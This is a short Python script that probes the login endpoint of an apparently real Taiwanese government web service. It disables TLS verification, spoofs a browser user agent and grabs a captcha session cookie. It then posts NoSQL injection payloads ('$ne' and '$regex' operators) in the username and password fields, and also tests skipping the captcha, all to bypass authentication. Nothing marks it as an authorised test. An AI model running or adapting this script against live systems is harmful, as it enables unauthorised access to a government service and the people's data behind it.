import requests, json
BASE="https://epcr.tpf.gov.tw:4004"
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
import urllib3; urllib3.disable_warnings()

def login(body,tag):
    s2=requests.Session(); s2.verify=False; s2.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        s2.get(BASE+"/captcha",timeout=12)
        sid=any(c.name=="connect.sid" for c in s2.cookies)
    except Exception as e: print(f"  [{tag}] cap fail {e}"); return
    r=s2.post(BASE+"/login",json=body,timeout=12)
    print(f"  [{tag}] sid={'Y' if sid else 'N'} -> {r.status_code} | {r.text[:85]}")

print("=== 带 session 的 /login ===")
login({"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"},"admin/x/cap1")
login({"username":"nouser99","password":"x","captcha":"1","domain":"AUTH_SERVER"},"nouser/cap1")
login({"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},"$ne/cap1")
login({"username":{"$regex":"^"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},"$regex/cap1")
login({"username":"admin","password":"x","domain":"AUTH_SERVER"},"admin/x/nocap")
print("DONE")
